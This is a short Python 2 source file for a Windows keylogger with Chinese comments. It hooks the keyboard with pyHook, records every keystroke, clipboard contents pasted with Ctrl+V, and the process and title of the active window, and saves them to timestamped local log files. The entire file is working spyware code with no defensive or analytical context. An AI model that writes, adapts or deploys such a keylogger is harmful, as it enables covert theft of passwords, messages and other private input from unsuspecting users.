# -*- coding: utf-8 -*-

from ctypes import *
import win32gui
import time
import pythoncom
import pyHook
import win32clipboard
import os

user32 = windll.user32
kernel32 =windll.kernel32
psapi = windll.psapi
current_window = None
filename = ''
msg = 'Start! \n'

##ls = []

def save(content):
    global filename
    with open('log'+os.sep+filename+'.txt','w') as f:
        f.write(content)
def get_current_process():
    hwnd = user32.GetForegroundWindow()  ##获得前台句柄
    ##if hwnd not in ls:
    ## 获得进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))
    process_id = "%d" % pid.value

    ##申请内存
    executable = create_string_buffer("\x00"*512)
    h_process = kernel32.OpenProcess(0x400|0x10,False,pid)
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    ## 读取窗口标题
    window_title = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(hwnd,byref(window_title),512)

    window_title1 = win32gui.GetWindowText(hwnd)
    title = "[PID: %s - %s - %s]" % (process_id,executable.value,window_title.value)
    print
    print "[PID: %s - %s - %s]" % (process_id,executable.value,window_title.value)
    ##print window_title1
    ##ls.append(hwnd)

    ## 关闭句柄
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    return title

def keystroke(event):
    global current_window
    global filename
    global msg

    if event.WindowName != current_window:
        current_window = event.WindowName
        title = get_current_process()
        if msg:
            try:
                filename = time.strftime("%Y-%m-%d-%H%M%S",time.localtime())
                save(msg)
                print "[Save]  %s " % filename
                msg = title
            except:
                pass
        

    ## 检测按键是否为常规按键（非组合键）
    if event.Ascii > 32 and event.Ascii < 127:
        msg += chr(event.Ascii)
        print chr(event.Ascii),
    else:
        ## ctrl+v的话，获取剪切板的内容
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            msg += "[Clipboard] - %s" % (pasted_value)
            print "[Clipboard] - %s" % (pasted_value),
        else:
            msg += "[%s]" % event.Key
            print "[%s]" % event.Key

    return True



if __name__ == "__main__":
    try:
        os.mkdir(log)
    except:
        pass
    kl = pyHook.HookManager()
    kl.KeyDown = keystroke

    kl.HookKeyboard()
    pythoncom.PumpMessages()
